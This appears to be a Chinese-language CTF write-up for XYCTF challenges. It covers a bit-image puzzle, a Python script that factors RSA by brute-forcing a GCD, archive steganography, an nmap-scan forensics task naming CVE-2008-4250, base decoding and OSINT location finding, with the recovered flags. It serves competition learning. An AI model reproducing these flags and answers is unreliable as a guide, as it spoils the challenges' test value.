yesnononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononoyesyesyesyesyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesyesyesyesnonoyesyesyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesyesyesyesyesnononononononononononononononononoyesyesyesyesyesyesyesyesyesnononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesnonononononononononononoyesyesyesyesnonononononononononoyesyesyesyesyesyesyesnononononoyesyesyesyesyesyesyesnonononononoyesyesyesyesyesnonononononononononononononononononononoyesyesyesyesyesnononononononononononononononononoyesyesyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesnononononononononononononononoyesyesyesyesyesyesyesyesyesyesnononononononoyesyesyesyesyesyesyesyesyesnononononononononononononononononononoyesyesyesyesyesnonononononononononoyesyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesnononononononononononononononononoyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesyesyesyesyesnonoyesyesyesyesyesyesyesyesyesyesyesyesnonoyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonoyesyesyesyesyesnononononononononononononoyesyesyesyesnonononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesnononononononononononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesnonononononononononoyesyesyesyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononoyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononoyesyesyesyesnonononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononoyesyesyesyesyesyesyesnononononononononononononononoyesyesyesyesyesyesnononoyesyesyesyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesnononononononononononononoyesyesyesnononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesnonononononononononononononononononononononoyesyesyesyesnononononononononononononononononononononononononononononononononononononononoyesyesyesyesnononononononononononononononononononononononononoyesyesyesyesnonononononononononoyesyesyesyesyesyesyesyesyesyesnononononononononononoyesyesyesyesyesnononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononoyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononoyesyesyesyesnonononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononoyesyesyesyesyesnononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesnonononononononononononononoyesnonononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesnonononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononoyesyesyesyesnononononononononononononononononononononononononoyesyesyesyesnonononononononononoyesyesyesyesyesyesyesyesyesnonononononononononononoyesyesyesyesnonononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononoyesyesyesnononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononoyesyesyesyesnononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononoyesyesyesnonononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesnonononoyesyesyesyesnonononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononoyesyesyesyesnonononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononoyesyesyesyesnononononononononononononononononononononononononoyesyesyesyesnonononononononononoyesyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesnonononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononoyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesnonononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnoyesyesnononononononononononoyesyesyesnononononononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononoyesyesnononononononononononononononononononononononononononoyesyesnonononononononononononononoyesnoyesnonononononononononononononononononononononononononononononononononononononononononononononononoyesnonononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononoyesnonononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononono
```

暂时无法在飞书文档外展示此内容

转成01，画图，尺寸548*72

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ODYyZWYyNDFkY2E4NmZmOGE2ODcxMjZlNjk5MGZmYjdfb0lEQnZIVHczeG5RandDcnNXVGpLQ05HNm5oamRtQmtfVG9rZW46RzFtbGJDS3J4b3IwcWl4eDNHd2NEb0F4bklkXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

原神须弥沙漠文

sm3rty0ucando

第九层

题目告诉我们$$a_1p+b_1q=l_1\\ a_2p+b_2q=l_2$$，但是$$a_1,a_2,b_1,b_2,p,q$$均未知，只知道 $$a_1,a_2<2^8,b_1,b_2<2^{256}$$。

注意到$$a_1a_2p+b_1a_2q=l_1a_2\\a_1a_2p+a_1b_2q=a_1l_2$$，得$$(b_1a_2-a_1b_2)q=l_1a_2-a_1l_2$$，

于是可以通过爆破 $$a_1,a_2$$的值，求 $$q=gcd(l_1a_2-a_1l_2,n)$$，最终检查 q.bit_length() ==512，解出p,q

```Python
from Crypto.Util.number import *
n = 107803636687595025440095910573280948384697923215825513033516157995095253288310988256293799364485832711216571624134612864784507225218094554935994320702026646158448403364145094359869184307003058983513345331145072159626461394056174457238947423145341933245269070758238088257304595154590196901297344034819899810707
c = 46049806990305232971805282370284531486321903483742293808967054648259532257631501152897799977808185874856877556594402112019213760718833619399554484154753952558768344177069029855164888168964855258336393700323750075374097545884636097653040887100646089615759824303775925046536172147174890161732423364823557122495
l = [618066045261118017236724048165995810304806699407382457834629201971935031874166645665428046346008581253113148818423751222038794950891638828062215121477677796219952174556774639587782398862778383552199558783726207179240239699423569318, 837886528803727830369459274997823880355524566513794765789322773791217165398250857696201246137309238047085760918029291423500746473773732826702098327609006678602561582473375349618889789179195207461163372699768855398243724052333950197]
e = 65537
for a1 in range(257):
    for a2 in range(257):
        l_ = abs(l[0] * a2 - l[1] * a1)
        q = GCD(l_, n)
        if q != 1 and q.bit_length() == 512:
            print('q =', q)
            print('p =', n // q)
            break
# 解得
q = 12951283811821084332224320465045864899191924765916891677355364529850728204537369439910942929239876470054661306841056350863576815710640615409980095344446711
p = 8323779962971618345273954895424806333469829912334300198060342319777227207496747203116360364049448374664074985646069999780324150495814809237871806097818437
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
print(long_to_bytes(pow(c, d, n)))
```

解得game_over

压缩包里两个文件

```你相信我吗.txt
压缩包里的图片真的有东西吗？不如看向外面
```

还有一个zip压缩包

应该是oursecret隐写，但是尚未知道密码，可以确定的是是对压缩包进行隐写的而不是对图片

密码也是game_over

找到_nine_turns?}

flag汇总：XYCTF{T3e_c0mb1nation_0f_crypt0_and_misc_1s_re6lly_fun!!L1u_and_K1cky_Mu_3re_so_sm4rt!In_just_a_few_m1nutes_they_were_thr0ugh!Sm3rt_y0u_can_do_nine_turns?}

要整一坨拿去md5，然后再套flag头

XYCTF{b1bdc6cf06a28b97c91c1c12f0d3bc00}

可惜三血被抢了

## 1.9 网络追踪

经过了一系列骚操作（其实就是用wireshark筛TCP流，很容易发现这个流量包是在用nmap在扫描靶机端口，查看有哪些端口完成了三次握手，代表端口开放）

找到了这玩意

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MjBhZWFiNmZhODU2NTU3NGJhOTBjMTM5MDNjMTUzYWZfd2VrSjRHNzZXRERGRUZSODR2cjVOM1MyVzd4MkJQaEFfVG9rZW46U0tEd2J6aGpGb3pDOVZ4RERwaWNDUVE3bkFoXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

```Bash
hK3Z1J2NvNa3fNJxaP43bTEfbb7zafODbacFaP43bte0wtPmDvvmOK3Z1J2Nv
huNqqtdmuOL1Zb91ZbM-TPapVQCO7eyODXyK5iiSOVCaRhiOQiiKwUCOIjiSO
hVCSffyKDcmXbZ95Zd8TZW91Zg6zaXd9ZW7QUt9WhuNSottGcLyWzayWVXCWz
hbiOCdGZTu6urtMyKuNqqtdmuQqVZP4nYjPzbZ8XbacHaj6zah7vbacF1JYLb
hj7PZXvRx0iGyWyywaZVNEpF4Sn2iAGsl9X3TC1UsLnUsLnVTEpN39H6kA1Yh
3An2kAro+
```

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NWFhYTk5YjZhOWIwY2Y2MDRjMTQyNjg3MTkxNTViNDFfQlFnVUF4V05mbmIwSzluR1dnMHdTeDN4N2xpNEc3V1ZfVG9rZW46SWJIVWJaeXo2b3NFMm94bUNJeWMyMHBjbkhmXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

经过漫长的信息检索后

XYCTF{192.168.204.133_445_139_135_**CVE-2008-4250**}

wireshark中显示的1065端口也是开放的，但这是利用漏洞打开的端口，一开始只开放了445，139，135三个端口

## 1.10 base

LBMUGVCGPNRDEOJUHE3GKMDGGY2GMYQ=NzY3NzIzNjE0ZjA5MzBiZjgxY30

等号与之前为第一段

XYCTF{b29496e0f64fb

第二段如base64

767723614f0930bf81c}

## 1.11 osint1

滨海新区，天津？根据hint，不是天津

广东茂名滨海新区**[博贺湾](https://baike.baidu.com/item/博贺湾新城/22309890?fromModule=lemma_inlink)****大道**

不对

百度识图

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGE1NzRjZDU4MjAzM2E4ZDI5OTVmOTcxZWJkNzY0ODVfTlo4T2xxTTVlWmdkUGFhTzhTQlNDcktJSmhhcVdyUFVfVG9rZW46TXVWRWIyUUpDb2k4WEZ4OTBxd2N2bDhjbmVkXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

在一篇blog中找到导航图，那么位置就可以确定了

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YWUwZDk1YzE3ZjMzZTVlNzYyZWEwZTliNTYxMzk4NGJfU05VQ241TjlaRXpoQTFtOUJJeEl0NDBCazc0QnFRdzJfVG9rZW46VW5rWWJLR1Vub1UyV3d4Y2ZHU2MzTDBjbmxnXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

在高德地图找到相应位置

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OWE1N2Q0Yjk2MTFmYmRlNGU1NDE1ZjQzMTBiNWIwNDhfdmVmdnlxWkl5QVo4TG5UQUc3ZmVPTDV0V1Y1czRiRUNfVG9rZW46Q1V6YWJtb1Rlb3lQdXh4QUZDb2NxZXhpbmhlXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

滨海东路。

那么就确定flag了。

江苏省南通市滨海东路黄海

xyctf{江苏省|南通市|滨海东路|黄海}

## 1.12 真签到

十六进制下就有flag

## 1.13 OSINT2

河南省，G3293次列车

龙门石窟？不对

高德搜周边 一个个试

最后结果是

老君山

xyctf{G3293|河南省|老君山}

## 1.14 base1024*2

XYCTF{84ca3a6e-3508-4e34-a5e0-7d0f03084181}

https://nerdmosis.com/tools/encode-and-decode-base2048

## 1.15 出题有点烦

压缩包密码123456

第一张图：XYCTF{可惜是假的}

第二三四张图：没东西

第五张图隐写了个压缩包，解开，密码是xyctf，十六进制看文件有flag

XYCTF{981e5_f3ca30_c841487_830f84_fb433e}

## 1.16 ez_osint

网上搜文本的头可以搜到时光邮局，评论区想笑死谁？

---

![83776a4079fc052d284173c78b0c838c](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/83776a4079fc052d284173c78b0c838c.jpeg?x-oss-process=style/blog)
